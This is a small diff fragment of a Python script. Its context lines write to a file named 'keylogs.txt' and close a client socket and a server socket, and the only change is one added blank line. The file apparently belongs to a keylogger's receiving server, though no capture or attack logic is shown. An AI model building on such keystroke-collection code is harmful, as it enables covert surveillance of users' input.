@@ -35,5 +35,6 @@ with open("keylogs.txt", "a") as log_file:
         except:
             break
 
+
 client_socket.close()
 server_socket.close()
